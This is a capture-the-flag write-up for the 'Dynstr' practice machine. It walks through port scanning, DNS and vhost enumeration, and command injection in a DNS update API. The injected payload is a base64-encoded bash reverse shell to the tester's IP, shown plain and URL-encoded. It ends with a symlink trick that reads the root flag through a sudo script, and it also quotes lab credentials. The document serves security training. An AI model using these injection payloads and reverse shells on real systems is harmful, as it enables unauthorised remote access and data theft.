# nmap
<div class="myprediv">
# Nmap 7.91 scan initiated Sun Jun 27 20:03:35 2021 as: nmap -sC -sV -A -vv --open -p- -oA nmap/10.10.10.244-Dynstr 10.10.10.244
Nmap scan report for 10.10.10.244
Host is up, received syn-ack (0.23s latency).
Scanned at 2021-06-27 20:03:35 SAST for 98s
Not shown: 64563 closed ports, 969 filtered ports
Reason: 64563 conn-refused and 969 no-responses
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON  VERSION
<span class="myYellow">22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)</span>
<pre>
| ssh-hostkey: 
|   3072 05:7c:5e:b1:83:f9:4f:ae:2f:08:e1:33:ff:f5:83:9e (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC//sbOTQwLRH4CGj3riDnnTvTCiJT1Uz7CyRSD2Tkh2wkT20rtAq13c5M1LC2kxki2bz9Ptxxx340Cc9tAcQaPZbmHndQe/H1bGiVZCKjOl2WqWQTV9fq6GGtflC94BkkLrmkWHzqg+S50g2Zg0iesPMkKAmwqwEVZx9npe1QuF3RQu5EYQXRYVOzpqQdU+jRD267gCvsKp9xmr7trZ1UzFxfBUOzSCWa3Adm2TTFwiA5jTb6x0lKVnQtgKghioMQeXXPuiTLCbI0XfbksoRI2OBAvTZf7RsIthKCiyCQRWjVh5Idr5Fh7GgwYaDgW662W3V3hCNEQRY8R9/fXWdVho1gWbm6NFt+NyRO/6F2XDvPseBYr+Yi6zwGEM+PpsTi5dfj8yYKRZ3HFXwjeBGjCPMRe9XPpCvvDnHAF18B1INVJPSwAIVll365V5D18JslQh7PpAWxO70TzmEC9E+UPXOrt29tZ0Zi/uApFRM700pdOhnvcs8q4RBWaUpp3ZB0=
|   256 3f:73:b4:95:72:ca:5e:33:f6:8a:8f:46:cf:43:35:b9 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBFtYzp8umMbm7o9+1LUTVio/dduowE/AsA3rO52A5Q/Cuct9GY6IZEvPE+/XpEiNCPMSl991kjHT+WaAunmTbT4=
|   256 cc:0a:41:b7:a1:9a:43:da:1b:68:f5:2a:f8:2a:75:2c (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOz8b9MDlSPP5QJgSHy6fpG98bdKCgvqhuu07v5NFkdx
</pre>
<span class="myTangerine">53/tcp open  domain  syn-ack ISC BIND 9.16.1 (Ubuntu Linux)</span>
| dns-nsid: 
|_  bind.version: 9.16.1-Ubuntu
<span class="myYellow">80/tcp open  http    syn-ack Apache httpd 2.4.41 ((Ubuntu))</span>
<pre>
| http-methods: 
|_  Supported Methods: HEAD GET POST OPTIONS
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Dyna DNS
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Jun 27 20:05:13 2021 -- 1 IP address (1 host up) scanned in 98.28 seconds
</pre>
</div>

## ports to be investigated
- port 22 - always the least most interesting 
- port 53 - not very commong on HTB. This is the most interesting vector considering the name 
- port 80 - mandatory visit

# web enumeration

![](DYNSTR.HTB-04.gif)
- no login page
- no robots.txt
- no recognisable CMS

<HR>

## /etc/hosts entries
- dyna.htb
- dnsalias.htb
- dynamicdns.htb
- no-ip.htb

![](DYNSTR.HTB-03.gif)
	

# dns enumeration



### dig axfr [1]

````bash
dig axfr dynstr.htb @10.10.10.244
````
![](DYNSTR.HTB-05.png)

zone transfer failed.

<HR>

### nslookup


```bash
nslookup 
> server 10.10.10.244
Default server: 10.10.10.244
Address: 10.10.10.244#53
> 10.10.10.244
** server can't find 244.10.10.10.in-addr.arpa: NXDOMAIN
> 
```


![](DYNSTR.HTB-06.png)
cannot resolve itself.
<HR>

## domain name brute-forcing
	
### gobuster
	
````bash
gobuster dns -d dyna.htb -r 10.10.10.244 -w subdomains-top1million-5000.txt
````

![](DYNSTR.HTB-07.png)
one subdomain found
````bash
dyn1.dyna.htb
````

### gobuster <span class="myRed">(the incorrect way)</span>

The incorrect way is running it without a resolver flag.
	
````bash
gobuster dns -d dyna.htb  -w subdomains-top1million-5000.txt # (incorrect)
vs
gobuster dns -d dyna.htb  -r 10.10.10.244 -w subdomains-top1million-5000.txt
````
![](DYNSTR.HTB-08.png)

<span class="myRed">no results found</span>

<HR>

### dig axfr [2]

	
````bash
dig dfxr dyn1.dyna.htb @10.10.10.244
````
	

````bash
; <<>> DiG 9.16.15-Debian <<>> dxfr dns1.dyna.htb @10.10.10.244
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NXDOMAIN, id: 22899
;; flags: qr rd ra ad; QUERY: 1, ANSWER: 0, AUTHORITY: 1, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; MBZ: 0x0005, udp: 1232
;; QUESTION SECTION:
;dxfr.				IN	A

;; AUTHORITY SECTION:
.			5	IN	SOA	a.root-servers.net. nstld.verisign-grs.com. 2021070500 1800 900 604800 86400

;; Query time: 168 msec
;; SERVER: 192.168.198.2#53(192.168.198.2)
;; WHEN: Mon Jul 05 21:49:30 SAST 2021
;; MSG SIZE  rcvd: 108

;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 41613
;; flags: qr aa rd; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1
;; WARNING: recursion requested but not available

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4096
; COOKIE: 5a2114998cc626dc0100000060e3630687c865623393750f (good)
;; QUESTION SECTION:
;dns1.dyna.htb.			IN	A

;; ANSWER SECTION:
dns1.dyna.htb.		60	IN	A	127.0.0.1

;; Query time: 236 msec
;; SERVER: 10.10.10.244#53(10.10.10.244)
;; WHEN: Mon Jul 05 21:49:30 SAST 2021
;; MSG SIZE  rcvd: 86

````
	
![](DYNSTR.HTB-09.png)
	
transfer was possible but usefulness questionable at time of making this report.

# vhosts enumeration
## dyna.htb
````bash
ffuf -w subdomains-top1million-5000.txt:FUZZ1 -u http://dyna.htb -H "Host: FUZZ1.dyna.htb" -fl 282
````

![](DYNSTR.HTB-10.png)
no results


## dnsalias.htb
````bash
fuf -w subdomains-top1million-5000.txt:FUZZ1 -u http://dnsalias.htb -H "Host: FUZZ1.dnsalias.htb" -fl 282
````

![](DYNSTR.HTB-11.png)
no results


# web enumeration continued
### enumerating dyna.htb

from the list of vhosts discovered on the web enumeration  [[HTB-Retired/10.10.10.244-Dynstr/20 - web]] we have 
- dyna.htb
- dnsalias.htb
- dynamicdns.htb
- no-ip.htb

## enumeration dyna.htb

````bash
gobuster dir -w /opt/SecLists/Discovery/Web-Content/raft-medium-directories.txt -u http://dyna.htb
````

![](DYNSTR.HTB-12.png)

- this results in the discovery of http://dyna.htb/nic
- no point browsing to this url as it is an error code 301

## enumeration dyna.htb/nic

````bash
gobuster dir -w /opt/SecLists/Discovery/Web-Content/raft-medium-directories.txt -u http://dyna.htb/nic
````

![](DYNSTR.HTB-13.png)

- this results in the discovery of http://dyna.htb/nic/update
- browsing to site yields an error message 'badauth', could there be an API involved ?

![](DYNSTR.HTB-14.png)


## enumeration dyna.htb/nic/update

````bash
gobuster dir -w /opt/SecLists/Discovery/Web-Content/raft-medium-directories.txt -u http://dyna.htb/nic
````

![](DYNSTR.HTB-15.png)

- this results in the discovery of a strange string.
- the string has no hits on google, however the path ```nic/update``` seems to point to something that relates to dns

![googling nic/update](DYNSTR.HTB-16.png#center)

- further inspection points towards an API to update the dns
- a base64 encoded auth string is suggested

![update api](DYNSTR.HTB-17.png#center)

- credentials were listed on the site 

![credentials](DYNSTR.HTB-18.png#center)

- <span class="myYellow" style="font-weight:bold">dynadns:sndanyd</span>

# user
starting off with the example code from noip.com

````bash
GET /nic/update?hostname=mytest.example.com&myip=192.0.2.25 HTTP/1.1
Host: dynupdate.no-ip.com
Authorization: Basic base64-encoded-auth-string
User-Agent: Company DeviceName-Model/FirmwareVersionNumber maintainer-contact@example.com
````

the code is modified to meet the current box
![no-ip.htb referece](DYNSTR.HTB-19.png#center)
<div class="myprediv">
	
GET /nic/update?hostname=<span class="myYellow">qdada.no-ip</span>.htb&myip=<span class="myYellow">10.10.10.244</span> HTTP/1.1
Host: <span class="myYellow">dyna.htb</span>
Authorization: Basic <span class="myYellow">ZHluYWRuczpzbmRhbnlkCg</span>
User-Agent: Company DeviceName-Model/FirmwareVersionNumber maintainer-contact@example.com
	
</div>

<HR>

## rce

This update application is vulnerable to command injection.
- make a bash reverse shell one-liner into base64
- enclose in back-ticks and insert immediatley after the hostname parameter

![base64 reverse shell](DYNSTR.HTB-20.png#center)

````bash
GET /nic/update?hostname=qdada.no-ip.htb&myip=10.10.10.244 HTTP/1.1
Host: dyna.htb
Authorization: Basic ZHluYWRuczpzbmRhbnlk
User-Agent: Company DeviceName-Model/FirmwareVersionNumber maintainer-contact@example.com


echo "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xNy85MDAxIDA+JjEK" | base64 -d | bash
#urlencode to :
echo%20%22YmFzaCAtaSA%2BJiAvZGV2L3RjcC8xMC4xMC4xNC4xNy85MDAxIDA%2BJjEK%22%20%7C%20base64%20-d%20%7C%20bash

````

URL encode and inject into request.

![code injection](DYNSTR.HTB-21.png#center)

header now looks like this

````bash
GET /nic/update?hostname=echo%20%22YmFzaCAtaSA%2BJiAvZGV2L3RjcC8xMC4xMC4xNC4xNy85MDAxIDA%2BJjEK%22%20%7C%20base64%20-d%20%7C%20bashqdada.no-ip.htb&myip=10.10.10.244 HTTP/1.1
Host: dyna.htb
Authorization: Basic ZHluYWRuczpzbmRhbnlk
User-Agent: Company DeviceName-Model/FirmwareVersionNumber maintainer-contact@example.com
````
reverse shell

![reverse shell](DYNSTR.HTB-22.gif#center)

on /home/bindmgr <span class="myYellow" style="font-wight:bold;">support-case-C62796521</span> is accessible

![accessible folder](DYNSTR.HTB-23.png#center)

in that folder, <span class="myYellow" style="font-wight:bold;">strace-C62796521.txt</span> contains a key

![](DYNSTR.HTB-24.png#center)	
![](DYNSTR.HTB-26.png#center)
	
the zone needs to be updated in order to logon by ssh.

<div class="myprediv">
nsupdate -k /etc/bind/<span class="myYellow" style="font-wight:bold;">infra</span>.key
	[ENTER]
update add <span class="myYellow" style="font-wight:bold;">test.infra</span>.dyna.htb 86400 A 10.10.14.17
	[ENTER]
update add 17.14.10.10.in.addr.apra 86400 PTR <span class="myYellow" style="font-wight:bold;">test.intra</span>.dyna.htb
	[ENTER]
	[ENTER]
&nbsp;
</div>

![](DYNSTR.HTB-27.gif)
After this part login with the key
	
````bash
ssh -i key bindmgr@10.10.10.244
````
![](DYNSTR.HTB-28.png)

	
# root
sudo -l reveals a script that can be run with no password
````bash
sudo -l
````
![](DYNSTR.HTB-30.png)



````bash
#!/usr/bin/bash
# This script generates named.conf.bindmgr to workaround the problem
# that bind/named can only include single files but no directories.
#
# It creates a named.conf.bindmgr file in /etc/bind that can be included
# from named.conf.local (or others) and will include all files from the
# directory /etc/bin/named.bindmgr.
#
# NOTE: The script is work in progress. For now bind is not including
#       named.conf.bindmgr. 
#
# TODO: Currently the script is only adding files to the directory but
#       not deleting them. As we generate the list of files to be included
#       from the source directory they won't be included anyway.

BINDMGR_CONF=/etc/bind/named.conf.bindmgr
BINDMGR_DIR=/etc/bind/named.bindmgr

indent() { sed 's/^/    /'; }

# Check versioning (.version)
echo "[+] Running $0 to stage new configuration from $PWD."
if [[ ! -f .version ]] ; then
    echo "[-] ERROR: Check versioning. Exiting."
    exit 42
fi
if [[ "`cat .version 2>/dev/null`" -le "`cat $BINDMGR_DIR/.version 2>/dev/null`" ]] ; then
    echo "[-] ERROR: Check versioning. Exiting."
    exit 43
fi

# Create config file that includes all files from named.bindmgr.
echo "[+] Creating $BINDMGR_CONF file."
printf '// Automatically generated file. Do not modify manually.\n' > $BINDMGR_CONF
for file in * ; do
    printf 'include "/etc/bind/named.bindmgr/%s";\n' "$file" >> $BINDMGR_CONF
done

# Stage new version of configuration files.
echo "[+] Staging files to $BINDMGR_DIR."
cp .version * /etc/bind/named.bindmgr/

# Check generated configuration with named-checkconf.
echo "[+] Checking staged configuration."
named-checkconf $BINDMGR_CONF >/dev/null
if [[ $? -ne 0 ]] ; then
    echo "[-] ERROR: The generated configuration is not valid. Please fix following errors: "
    named-checkconf $BINDMGR_CONF 2>&1 | indent
    exit 44
else 
    echo "[+] Configuration successfully staged."
    # *** TODO *** Uncomment restart once we are live.
    # systemctl restart bind9
    if [[ $? -ne 0 ]] ; then
        echo "[-] Restart of bind9 via systemctl failed. Please check logfile: "
	systemctl status bind9
    else
	echo "[+] Restart of bind9 via systemctl succeeded."
    fi
fi
````
- script looks for a file callted .version.
- if the file contains the number 1.1 then it will copy all the contents of .version to /etc/bind/named.bindmgr
- subsequently creating a symbolic link to /root/root.txt from .version will ensure the content of /root/root.txt  are copied to /etc/bind/named.bindmgr


````basj
echo "1.1" > .version
sudo /usr/local/bin/bindmgr.sh
rm .version
ln -s /root/root.txt .version
sudo /usr/local/bin/bindmgr.sh
cat /etc/bind/named.bindmgr/.version
````

![](DYNSTR.HTB-31.gif)


